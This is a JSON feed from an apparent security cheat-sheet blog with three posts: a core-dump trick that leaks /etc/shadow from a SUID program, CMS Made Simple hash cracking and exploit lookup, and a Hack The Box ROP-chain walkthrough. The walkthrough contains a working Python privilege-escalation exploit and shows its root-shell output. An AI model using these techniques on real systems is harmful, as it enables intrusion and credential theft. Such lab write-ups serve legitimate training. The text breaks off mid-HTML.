{
    "version": "https://jsonfeed.org/version/1",
    "title": "Spindel",
    "home_page_url": "https://mvineza.github.io/spindel/",
    "feed_url": "https://mvineza.github.io/spindel/feed.json",
    "description": "A minimalist, quick search cybersecurity blog and cheatsheets",
    "icon": "https://mvineza.github.io/spindel/apple-touch-icon.png",
    "favicon": "https://mvineza.github.io/spindel/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "spindel",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/19/core-dump-technique",
            "title": "Core Dump Technique",
            "summary": "Core Dump Technique",
            "content_text": "OverviewAttacker can force crash a program to generate a coredump so he can read the buffered data (eg/etc/shadow ) inside.Environment  Program has SUID bit set-rwsr-xr-x 1 root root 17824 Oct  7 10:03 count*  Program also forces core dump generationprctl(PR_SET_DUMPABLE, 1);  fs.suid_dumpable is set to 2.dasith@secret:/opt$ cat /proc/sys/fs/suid_dumpable2dasith@secret:/opt$ Steps  Run program and put a sensitive file and stop at another user inputdasith@secret:/opt$ ./count Enter source file/directory name: /etc/shadowTotal characters = 1187Total words      = 36Total lines      = 36Save results a file? [y/N]:   Background the programdasith@secret:/opt$ ./count Enter source file/directory name: /etc/shadowTotal characters = 1187Total words      = 36Total lines      = 36Save results a file? [y/N]: ^Z[1]+  Stopped                 ./countdasith@secret:/opt$   Send SIGSEGV signal. You can also use kill -BUS PID.dasith@secret:/opt$ kill -SIGSEGV `pidof count`  Resume the job and you will see core dump has been generateddasith@secret:/opt$ fg./countSegmentation fault (core dumped)dasith@secret:/opt$ ls -lrt /var/crash/total 32-rw-r----- 1 dasith dasith 28756 Dec 11 04:51 _opt_count.1000.crashdasith@secret:/opt$   To analyze the coredump, use apport-unpack and open CoreDump filedasith@secret:/opt$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-reportdasith@secret:/opt$ strings /tmp/crash-report/CoreDump | grep rootroot:$6$/0f5J.S8.u.dA78h$xSyDRhh5Zf18Ha9XNVo5dvPhxnI0i7D/uD8T5FcYgN1FYMQbvkZakMgjgm3bhtS6hgKWBcD/QJqPgQR6cycFj.:18873:0:99999:7:::dasith@secret:/opt$ References  HTB secret",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can force crash a program to generate a coredump so he can read the buffered data (eg<code class=\"language-plaintext highlighter-rouge\">/etc/shadow</code> ) inside.</p><h2 id=\"environment\">Environment</h2><ul>  <li>Program has SUID bit set</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nt\">-rwsr-xr-x</span> 1 root root 17824 Oct  7 10:03 count<span class=\"k\">*</span></code></pre></div></div><ul>  <li>Program also forces core dump generation</li></ul><div class=\"language-c highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">prctl</span><span class=\"p\">(</span><span class=\"n\">PR_SET_DUMPABLE</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">);</span></code></pre></div></div><ul>  <li><code class=\"language-plaintext highlighter-rouge\">fs.suid_dumpable</code> is set to 2.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>dasith@secret:/opt<span class=\"nv\">$ </span><span class=\"nb\">cat</span> /proc/sys/fs/suid_dumpable2dasith@secret:/opt<span class=\"nv\">$ </span></code></pre></div></div><h2 id=\"steps\">Steps</h2><ul>  <li>Run program and put a sensitive file and stop at another user input</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>dasith@secret:/opt<span class=\"nv\">$ </span>./count Enter <span class=\"nb\">source </span>file/directory name: /etc/shadowTotal characters <span class=\"o\">=</span> 1187Total words      <span class=\"o\">=</span> 36Total lines      <span class=\"o\">=</span> 36Save results a file? <span class=\"o\">[</span>y/N]: </code></pre></div></div><ul>  <li>Background the program</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>dasith@secret:/opt<span class=\"nv\">$ </span>./count Enter <span class=\"nb\">source </span>file/directory name: /etc/shadowTotal characters <span class=\"o\">=</span> 1187Total words      <span class=\"o\">=</span> 36Total lines      <span class=\"o\">=</span> 36Save results a file? <span class=\"o\">[</span>y/N]: ^Z<span class=\"o\">[</span>1]+  Stopped                 ./countdasith@secret:/opt<span class=\"nv\">$ </span></code></pre></div></div><ul>  <li>Send <code class=\"language-plaintext highlighter-rouge\">SIGSEGV</code> signal. You can also use <code class=\"language-plaintext highlighter-rouge\">kill -BUS PID</code>.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>dasith@secret:/opt<span class=\"nv\">$ </span><span class=\"nb\">kill</span> <span class=\"nt\">-SIGSEGV</span> <span class=\"sb\">`</span>pidof count<span class=\"sb\">`</span></code></pre></div></div><ul>  <li>Resume the job and you will see core dump has been generated</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>dasith@secret:/opt<span class=\"nv\">$ </span><span class=\"nb\">fg</span>./countSegmentation fault <span class=\"o\">(</span>core dumped<span class=\"o\">)</span>dasith@secret:/opt<span class=\"nv\">$ </span><span class=\"nb\">ls</span> <span class=\"nt\">-lrt</span> /var/crash/total 32<span class=\"nt\">-rw-r-----</span> 1 dasith dasith 28756 Dec 11 04:51 _opt_count.1000.crashdasith@secret:/opt<span class=\"nv\">$ </span></code></pre></div></div><ul>  <li>To analyze the coredump, use <code class=\"language-plaintext highlighter-rouge\">apport-unpack</code> and open <code class=\"language-plaintext highlighter-rouge\">CoreDump</code> file</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>dasith@secret:/opt<span class=\"nv\">$ </span>apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-reportdasith@secret:/opt<span class=\"nv\">$ </span>strings /tmp/crash-report/CoreDump | <span class=\"nb\">grep </span>rootroot:<span class=\"nv\">$6$/</span>0f5J.S8.u.dA78h<span class=\"nv\">$xSyDRhh5Zf18Ha9XNVo5dvPhxnI0i7D</span>/uD8T5FcYgN1FYMQbvkZakMgjgm3bhtS6hgKWBcD/QJqPgQR6cycFj.:18873:0:99999:7:::dasith@secret:/opt<span class=\"nv\">$ </span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB secret</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/01/19/core-dump-technique",
            
            
            
            "tags": ["linux","privesc"],
            
            "date_published": "2022-01-19T00:00:00+08:00",
            "date_modified": "2022-01-19T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/16/cms-made-simple",
            "title": "CMS Made Simple",
            "summary": "CMS Made Simple",
            "content_text": "OverviewOpen Source Content Management System : : CMS Made SimpleVersion  Via changelog /doc/CHANGELOG.txt  Inside admin page, bottom partCredentialsadmin:  Passwords are  stored in database using 1-way password schememysql&gt; select user_id,username,password from cms_users;+---------+----------+----------------------------------+| user_id | username | password                         |+---------+----------+----------------------------------+|       1 | admin    | 9dfb6c17c8992e3a821c47b68fe8e76a ||       2 | editor   | 5aee9dbd2a188839105073571bee1b1f |  You can crack it via hascat# 62def4866937f08cc13bab43bb14e6f7 - hashed password# 5a599ef579066807 - salthashcat -m 20 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807 /usr/share/wordlists/rockyou.txtInteresting URL PathsReference: http://svn.cmsmadesimple.org/svn/cmsmadesimple/trunk/Interesting Filesconfig.phpCookie Format# Example:# CMSSESSID9d372ef93962=75gsp75a2vdo6ijapmnvqrkdb2CMSSESSID*Some Exploits# CVE-2019-9053 - change TIME to 2 for better resultsearchploit -m php/webapps/46635.pyReferences  Identifying &amp; Exploiting SSTI &amp; XSS in CMS Made Simple",
            "content_html": "<h2 id=\"overview\">Overview</h2><p><img src=\"/spindel/assets/CMS%20Made%20Simple/20E7EA44-40D7-4648-B62C-75B0B1FF9941.png\" alt=\"\" /></p><p><a href=\"http://www.cmsmadesimple.org/\">Open Source Content Management System : : CMS Made Simple</a></p><h2 id=\"version\">Version</h2><ul>  <li>Via changelog <code class=\"language-plaintext highlighter-rouge\">/doc/CHANGELOG.txt</code></li>  <li>Inside admin page, bottom part</li></ul><h2 id=\"credentials\">Credentials</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>admin:</code></pre></div></div><ul>  <li>Passwords are  stored in database using 1-way password scheme</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>mysql&gt; select user_id,username,password from cms_users;+---------+----------+----------------------------------+| user_id | username | password                         |+---------+----------+----------------------------------+|       1 | admin    | 9dfb6c17c8992e3a821c47b68fe8e76a ||       2 | editor   | 5aee9dbd2a188839105073571bee1b1f |</code></pre></div></div><ul>  <li>You can crack it via hascat</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># 62def4866937f08cc13bab43bb14e6f7 - hashed password</span><span class=\"c\"># 5a599ef579066807 - salt</span>hashcat <span class=\"nt\">-m</span> 20 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807 /usr/share/wordlists/rockyou.txt</code></pre></div></div><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><p><img src=\"/spindel/assets/CMS%20Made%20Simple/49CFCD40-2C62-453A-872C-91DEAAAF5E2C.png\" alt=\"\" /></p><p>Reference: http://svn.cmsmadesimple.org/svn/cmsmadesimple/trunk/</p><h2 id=\"interesting-files\">Interesting Files</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>config.php</code></pre></div></div><h2 id=\"cookie-format\">Cookie Format</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Example:</span><span class=\"c\"># CMSSESSID9d372ef93962=75gsp75a2vdo6ijapmnvqrkdb2</span>CMSSESSID<span class=\"k\">*</span></code></pre></div></div><h2 id=\"some-exploits\">Some Exploits</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># CVE-2019-9053 - change TIME to 2 for better result</span>searchploit <span class=\"nt\">-m</span> php/webapps/46635.py</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.netsparker.com/blog/web-security/exploiting-ssti-and-xss-in-cms-made-simple/\">Identifying &amp; Exploiting SSTI &amp; XSS in CMS Made Simple</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/01/16/cms-made-simple",
            
            
            
            "tags": ["web","cms","enum"],
            
            "date_published": "2022-01-16T00:00:00+08:00",
            "date_modified": "2022-01-16T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/15/bypass-aslr-nx-64-bit-rop-chain",
            "title": "Bypass ASLR + NX (64-bit) - ROP Chain",
            "summary": "Bypass ASLR + NX (64-bit) - ROP Chain",
            "content_text": "OverviewIf ASLR and NX is enabled on a 64-bit program, this means we cannot execute code on stack and address space of libraries changes on every program run.In this technique, we can find some ROP gadgets whose address are static and we can use them to do setuid(0) and drop to a shell using execvpe().Environment Setup  SETUID program whose vulnerable to buffer overflow. In this example, we can see that even though fgets is assumed to be safe from bufferoverflow, a misconfigured program is still vulnerable.// filename: iptctl// [...redacted...]// 360 bytes here#define BUFFSIZE 360void interactive(char *ip, char *action, char *name){        char inputAddress[16];        // but destination buffer locally is 10 bytes only!        // this is the buffer overflow part        char inputAction[10];        printf(\"Entering interactive mode\\n\");        printf(\"Action(allow|restrict|show): \");        // hence, fgets is not using the correct buffer size        fgets(inputAction,BUFFSIZE,stdin);        // this also have vulnerable fgets but we will ignore        // this part since its hard to send arbritrary input        // here, inputAddress is being validated properly        fgets(inputAddress,BUFFSIZE,stdin);        fflush(stdin);        inputAddress[strlen(inputAddress)-1] = 0;        // this is the validation part, isValidIpAddress is        // validated properly but not isValidAction        if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){                printf(\"Usage: %s allow|restrict|show IP\\n\", name);                exit(0);        }        strcpy(ip, inputAddress);        strcpy(action, inputAction);        return;// [...redacted...]We will also use GDB peda as our debugger.Steps  Get a copy of binary and put it on your attacker machine  Determine protections# check ASLR on victim machinepenelope@redcross:/dev/shm$ cat /proc/sys/kernel/randomize_va_space2penelope@redcross:/dev/shm$# check PIE on gdb peda on attacker machinegdb-peda$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : Partialgdb-peda$   Find offset to RIP# set breakpointsbr *interactive+73br *interactive+73# create pattern - 50 is more than enough since we only need# 10 bytes to overflowpattern_create 50# run interactivelygdb-peda$ run -iStarting program: /home/kali/data/practice/hack_the_box/linux/redcross/iptctl -iEntering interactive modeAction(allow|restrict|show): allowAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA# [...redacted....]# find offset - get value of \"saved rip\" firstinfo frame pattern_offset 0x4541412941413b41# offset is 29  Since we cannot execute code on stack, we need to find a static address of gadgets we can use. These addresses will remain the same inside victim and attacker machine. I believe the reason is because PIE is not enabled on the program. We also wanted to do setuid(0) first before dropping to shell via execvp so that can gain the effective UID of root. Our payload structure will look like this. For detailed information about the payload structure, see the section below “Explaining the payload structure”.payload = \"allow\" + \"A\"*29 + pop_rdi_addr + null + setuid_addr + pop_rdi_addr + sh_addr + pop_rsi_pop_r15_addr + null + null + execvp_addr + \"\\n\" + \"1.1.1.1\" + \"\\n\"  Now let’s find the values# pop_rdi_addrgdb-peda$ ropsearch \"pop rdi\"# null\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"# setuid_addrgdb-peda$ plt# [...redacted...]Breakpoint 37 at 0x400780 (setuid@plt)# [...redacted...]gdb-peda$# sh_addrgdb-peda$ find \"sh\"# [...redacted...]    iptctl : 0x40046e --&gt; 0x7063727473006873 ('sh')# [...redacted...]# pop_rsi_pop_r15_addrgdb-peda$ ropsearch \"pop rsi\"# [...redacted...]0x00400de1 : (b'5e415fc3')\tpop rsi; pop r15; retgdb-peda$ # execvp_addrgdb-peda$ pltBreakpoint 42 at 0x400760 (execvp@plt)# [...redacted...]gdb-peda$   Let’s construct our final python script. I will not use pwn tools to show how this is being done without any helper functions.#!/usr/bin/env python# gadgets and variables - take note that due to being little# endian, we need to consutrct the memory addresses in reverse# order. For example, if we see an addres in gdb which is# \"0x400760\" in python it will be \"\\x60\\x07\\x40\".# # Another thing to take note of is that since we are dealing# with 64-bit architecture, you might often see in debuggers# that they only display 6 bytes of address instead of 8.# That's because the remaining 2 bytes are not used. So in our# python script, just replace the missing 2 bytes with NULL# bytes \"\\x00\\x00\".                                                           pop_rdi_addr = \"\\xe3\\x0d\\x40\\x00\\x00\\x00\\x00\\x00\"                                                                                                   sh_addr = \"\\x6e\\04\\x40\\x00\\x00\\x00\\x00\\x00\"                                                                                               pop_rsi_pop_r15_addr = \"\\xe1\\x0d\\x40\\x00\\x00\\x00\\x00\\x00\"                                                                                            execvp_addr = \"\\x60\\x07\\x40\\x00\\x00\\x00\\x00\\x00\"                                                                                                   setuid_addr = \"\\x80\\x07\\x40\\x00\\x00\\x00\\x00\\x00\"                                null = \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"                                                                                payload = \"allow\" + \"A\"*29payload += pop_rdi_addr + null + setuid_addrpayload += pop_rdi_addr + sh_addr + pop_rsi_pop_r15_addr + null + null + execvp_addr + \"\\n\"payload += \"1.1.1.1\" + \"\\n\"print(payload)  Copy this script any run on victim machinepenelope@redcross:/dev/shm$ (python2 bof.py;cat -) | /opt/iptctl/iptctl -iEntering interactive modeiduid=0(root) gid=1000(penelope) egid=0(root) groups=0(root),4(adm),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),116(scanner),1000(penelope),1003(mailadm)Explaining the payload structureFirst things to understand is how the calling conventions work for 32-bit and 64-bit architectures.execvp()NULLNULLpop rsi; pop r15; ret\"sh\"pop rdi; retsetuid()NULLpop rdi; ret\"allow\" + \"A\"*29To better understand, let’s divide the payload into different stack frames.# stack frame 2execvp()NULLNULLpop rsi; pop r15; ret\"sh\"pop rdi; ret# stack frame 1setuid()NULLpop rdi; ret\"allow\" + \"A\"*29Let’s take a closer look at stack frame 1.## higher memory address ### Once the \"pop rdi\" instruction is finished executing, the# next instructions is \"ret\". Since \"setuid()\" address is the# next value from stack, the flow of execution will now go# there completing our command `setuid(0)`.setuid()# When the \"pop rdi\" instruction executes, it will pop# the next value from the stack into RDI. That next value is# NULL which is also equal to \"0\".NULL# This contains the address of \"pop rdi; ret\". Why do need it?# In 64-bit calling convention, to pass a parameter to a# function, in this case `setuid()`, we need to put the# parameter into RDI. Then once its there, the function will# get it in the form of `setuid(0)`.pop rdi; ret# This is the overflow part which will allow us to control the# next instruction to execute which is on RIP. The next# instruction will be on top of this.\"allow\" + \"A\"*29## lower memory address ##Then for stack frame 2.## higher memory address ### When \"ret\" executes, it will go to address of instruction# `execvp()` completing our final function call which is# `execvp(\"sh\", NULL)`execvp()# When \"pop r15\" executes, it will put NULL into RSINULL# When \"pop rsi\" executes, it will put NULL into RSINULL# When \"ret\" instruction executes, it will go to this# instruction. Why do we need \"pop r15\"? Actually we don't# need it. It just happened that there is no gadget which# consists only of \"pop rsi\". So for completenes, we have no# choice but to include also \"pop r15\" in our ROP chain.pop rsi; pop r15; ret# When \"pop rdi\" instruction executes, it will put \"sh\" into# RDI since this is the next value in the stack.\"sh\"# Continuing from previous stack frame, the next instruction# to execute is \"pop rdi; ret\". In this case our target# function call is `execvp()`. It accepts 2 parameters:#  1. the string we want to execute in this case its#     `/bin/sh` or just \"sh\". This should be put to RDI.#  2. a NULL terminator and must be put to RSI.pop rdi; ret## lower memory address ##Here is also an illustration of stack flow of stack frame 1. Flow for stack frame 2 will be similar.## stack view @ RIP \"pop_rdi_addr\"setuid_addrnullpop_rdi_addr    # --&gt; flow executions continues @ this addr## stack view @ pop rdisetuid_addrnull            # --&gt; POP to RDI## stack view @ retsetuid_addr     # --&gt; executes `setuid(0)`References  HTB RedCross",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>If ASLR and NX is enabled on a 64-bit program, this means we cannot execute code on stack and address space of libraries changes on every program run.</p><p>In this technique, we can find some ROP gadgets whose address are static and we can use them to do <code class=\"language-plaintext highlighter-rouge\">setuid(0)</code> and drop to a shell using <code class=\"language-plaintext highlighter-rouge\">execvpe()</code>.</p><h2 id=\"environment-setup\">Environment Setup</h2><ul>  <li>SETUID program whose vulnerable to buffer overflow. In this example, we can see that even though <code class=\"language-plaintext highlighter-rouge\">fgets</code> is assumed to be safe from bufferoverflow, a misconfigured program is still vulnerable.</li></ul><div class=\"language-c highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// filename: iptctl</span><span class=\"c1\">// [...redacted...]</span><span class=\"c1\">// 360 bytes here</span><span class=\"cp\">#define BUFFSIZE 360</span><span class=\"kt\">void</span> <span class=\"nf\">interactive</span><span class=\"p\">(</span><span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"n\">ip</span><span class=\"p\">,</span> <span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"n\">action</span><span class=\"p\">,</span> <span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"n\">name</span><span class=\"p\">){</span>        <span class=\"kt\">char</span> <span class=\"n\">inputAddress</span><span class=\"p\">[</span><span class=\"mi\">16</span><span class=\"p\">];</span>        <span class=\"c1\">// but destination buffer locally is 10 bytes only!</span>        <span class=\"c1\">// this is the buffer overflow part</span>        <span class=\"kt\">char</span> <span class=\"n\">inputAction</span><span class=\"p\">[</span><span class=\"mi\">10</span><span class=\"p\">];</span>        <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"Entering interactive mode</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">);</span>        <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"Action(allow|restrict|show): \"</span><span class=\"p\">);</span>        <span class=\"c1\">// hence, fgets is not using the correct buffer size</span>        <span class=\"n\">fgets</span><span class=\"p\">(</span><span class=\"n\">inputAction</span><span class=\"p\">,</span><span class=\"n\">BUFFSIZE</span><span class=\"p\">,</span><span class=\"n\">stdin</span><span class=\"p\">);</span>        <span class=\"c1\">// this also have vulnerable fgets but we will ignore</span>        <span class=\"c1\">// this part since its hard to send arbritrary input</span>        <span class=\"c1\">// here, inputAddress is being validated properly</span>        <span class=\"n\">fgets</span><span class=\"p\">(</span><span class=\"n\">inputAddress</span><span class=\"p\">,</span><span class=\"n\">BUFFSIZE</span><span class=\"p\">,</span><span class=\"n\">stdin</span><span class=\"p\">);</span>        <span class=\"n\">fflush</span><span class=\"p\">(</span><span class=\"n\">stdin</span><span class=\"p\">);</span>        <span class=\"n\">inputAddress</span><span class=\"p\">[</span><span class=\"n\">strlen</span><span class=\"p\">(</span><span class=\"n\">inputAddress</span><span class=\"p\">)</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>        <span class=\"c1\">// this is the validation part, isValidIpAddress is</span>        <span class=\"c1\">// validated properly but not isValidAction</span>        <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span> <span class=\"n\">isValidAction</span><span class=\"p\">(</span><span class=\"n\">inputAction</span><span class=\"p\">)</span> <span class=\"o\">||</span> <span class=\"o\">!</span> <span class=\"n\">isValidIpAddress</span><span class=\"p\">(</span><span class=\"n\">inputAddress</span><span class=\"p\">)){</span>                <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"Usage: %s allow|restrict|show IP</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">,</span> <span class=\"n\">name</span><span class=\"p\">);</span>                <span class=\"n\">exit</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"p\">}</span>        <span class=\"n\">strcpy</span><span class=\"p\">(</span><span class=\"n\">ip</span><span class=\"p\">,</span> <span class=\"n\">inputAddress</span><span class=\"p\">);</span>        <span class=\"n\">strcpy</span><span class=\"p\">(</span><span class=\"n\">action</span><span class=\"p\">,</span> <span class=\"n\">inputAction</span><span class=\"p\">);</span>        <span class=\"k\">return</span><span class=\"p\">;</span><span class=\"c1\">// [...redacted...]</span></code></pre></div></div><p>We will also use GDB peda as our debugger.</p><h2 id=\"steps\">Steps</h2><ul>  <li>Get a copy of binary and put it on your attacker machine</li>  <li>Determine protections</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># check ASLR on victim machine</span>penelope@redcross:/dev/shm<span class=\"nv\">$ </span><span class=\"nb\">cat</span> /proc/sys/kernel/randomize_va_space2penelope@redcross:/dev/shm<span class=\"err\">$</span><span class=\"c\"># check PIE on gdb peda on attacker machine</span>gdb-peda<span class=\"nv\">$ </span>checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : Partialgdb-peda<span class=\"nv\">$ </span></code></pre></div></div><ul>  <li>Find offset to <code class=\"language-plaintext highlighter-rouge\">RIP</code></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># set breakpoints</span>br <span class=\"k\">*</span>interactive+73br <span class=\"k\">*</span>interactive+73<span class=\"c\"># create pattern - 50 is more than enough since we only need</span><span class=\"c\"># 10 bytes to overflow</span>pattern_create 50<span class=\"c\"># run interactively</span>gdb-peda<span class=\"nv\">$ </span>run <span class=\"nt\">-i</span>Starting program: /home/kali/data/practice/hack_the_box/linux/redcross/iptctl <span class=\"nt\">-i</span>Entering interactive modeAction<span class=\"o\">(</span>allow|restrict|show<span class=\"o\">)</span>: allowAAA%AAsAABAA<span class=\"nv\">$AAnAACAA</span><span class=\"nt\">-AA</span><span class=\"o\">(</span>AADAA<span class=\"p\">;</span>AA<span class=\"o\">)</span>AAEAAaAA0AAFAAbA<span class=\"c\"># [...redacted....]</span><span class=\"c\"># find offset - get value of \"saved rip\" first</span>info frame pattern_offset 0x4541412941413b41<span class=\"c\"># offset is 29</span></code></pre></div></div><ul>  <li>Since we cannot execute code on stack, we need to find a static address of gadgets we can use. These addresses will remain the same inside victim and attacker machine. I believe the reason is because PIE is not enabled on the program. We also wanted to do <code class=\"language-plaintext highlighter-rouge\">setuid(0)</code> first before dropping to shell via <code class=\"language-plaintext highlighter-rouge\">execvp</code> so that can gain the effective UID of root. Our payload structure will look like this. For detailed information about the payload structure, see the section below “Explaining the payload structure”.</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"s\">\"allow\"</span> <span class=\"o\">+</span> <span class=\"s\">\"A\"</span><span class=\"o\">*</span><span class=\"mi\">29</span> <span class=\"o\">+</span> <span class=\"n\">pop_rdi_addr</span> <span class=\"o\">+</span> <span class=\"n\">null</span> <span class=\"o\">+</span> <span class=\"n\">setuid_addr</span> <span class=\"o\">+</span> <span class=\"n\">pop_rdi_addr</span> <span class=\"o\">+</span> <span class=\"n\">sh_addr</span> <span class=\"o\">+</span> <span class=\"n\">pop_rsi_pop_r15_addr</span> <span class=\"o\">+</span> <span class=\"n\">null</span> <span class=\"o\">+</span> <span class=\"n\">null</span> <span class=\"o\">+</span> <span class=\"n\">execvp_addr</span> <span class=\"o\">+</span> <span class=\"s\">\"</span><span class=\"se\">\\n</span><span class=\"s\">\"</span> <span class=\"o\">+</span> <span class=\"s\">\"1.1.1.1\"</span> <span class=\"o\">+</span> <span class=\"s\">\"</span><span class=\"se\">\\n</span><span class=\"s\">\"</span></code></pre></div></div><ul>  <li>Now let’s find the values</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># pop_rdi_addr</span>gdb-peda<span class=\"nv\">$ </span>ropsearch <span class=\"s2\">\"pop rdi\"</span><span class=\"c\"># null</span><span class=\"s2\">\"</span><span class=\"se\">\\x</span><span class=\"s2\">00</span><span class=\"se\">\\x</span><span class=\"s2\">00</span><span class=\"se\">\\x</span><span class=\"s2\">00</span><span class=\"se\">\\x</span><span class=\"s2\">00</span><span class=\"se\">\\x</span><span class=\"s2\">00</span><span class=\"se\">\\x</span><span class=\"s2\">00</span><span class=\"se\">\\x</span><span class=\"s2\">00</span><span class=\"se\">\\x</span><span class=\"s2\">00\"</span><span class=\"c\"># setuid_addr</span>gdb-peda<span class=\"nv\">$ </span>plt<span class=\"c\"># [...redacted...]</span>Breakpoint 37 at 0x400780 <span class=\"o\">(</span>setuid@plt<span class=\"o\">)</span><span class=\"c\"># [...redacted...]</span>gdb-peda<span class=\"err\">$</span><span class=\"c\"># sh_addr</span>gdb-peda<span class=\"nv\">$ </span>find <span class=\"s2\">\"sh\"</span><span class=\"c\"># [...redacted...]</span>    iptctl : 0x40046e <span class=\"nt\">--</span><span class=\"o\">&gt;</span> 0x7063727473006873 <span class=\"o\">(</span><span class=\"s1\">'sh'</span><span class=\"o\">)</span><span class=\"c\"># [...redacted...]</span><span class=\"c\"># pop_rsi_pop_r15_addr</span>gdb-peda<span class=\"nv\">$ </span>ropsearch <span class=\"s2\">\"pop rsi\"</span><span class=\"c\"># [...redacted...]</span>0x00400de1 : <span class=\"o\">(</span>b<span class=\"s1\">'5e415fc3'</span><span class=\"o\">)</span>\tpop rsi<span class=\"p\">;</span> pop r15<span class=\"p\">;</span> retgdb-peda<span class=\"nv\">$ </span><span class=\"c\"># execvp_addr</span>gdb-peda<span class=\"nv\">$ </span>pltBreakpoint 42 at 0x400760 <span class=\"o\">(</span>execvp@plt<span class=\"o\">)</span><span class=\"c\"># [...redacted...]</span>gdb-peda<span class=\"nv\">$ </span></code></pre></div></div><ul>  <li>Let’s construct our final python script. I will not use <code class=\"language-plaintext highlighter-rouge\">pwn</code> tools to show how this is being done without any helper functions.</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">#!/usr/bin/env python</span><span class=\"c1\"># gadgets and variables - take note that due to being little# endian, we need to consutrct the memory addresses in reverse# order. For example, if we see an addres in gdb which is# \"0x400760\" in python it will be \"\\x60\\x07\\x40\".# # Another thing to take note of is that since we are dealing# with 64-bit architecture, you might often see in debuggers# that they only display 6 bytes of address instead of 8.# That's because the remaining 2 bytes are not used. So in our# python script, just replace the missing 2 bytes with NULL# bytes \"\\x00\\x00\".                                                           </span><span class=\"n\">pop_rdi_addr</span> <span class=\"o\">=</span> <span class=\"s\">\"</span><span class=\"se\">\\xe3\\x0d\\x40\\x00\\x00\\x00\\x00\\x00</span><span class=\"s\">\"</span>                                                                                                   <span class=\"n\">sh_addr</span> <span class=\"o\">=</span> <span class=\"s\">\"</span><span class=\"se\">\\x6e\\04\\x40\\x00\\x00\\x00\\x00\\x00</span><span class=\"s\">\"</span>                                                                                               <span class=\"n\">pop_rsi_pop_r15_addr</span> <span class=\"o\">=</span> <span class=\"s\">\"</span><span class=\"se\">\\xe1\\x0d\\x40\\x00\\x00\\x00\\x00\\x00</span><span class=\"s\">\"</span>                                                                                            <span class=\"n\">execvp_addr</span> <span class=\"o\">=</span> <span class=\"s\">\"</span><span class=\"se\">\\x60\\x07\\x40\\x00\\x00\\x00\\x00\\x00</span><span 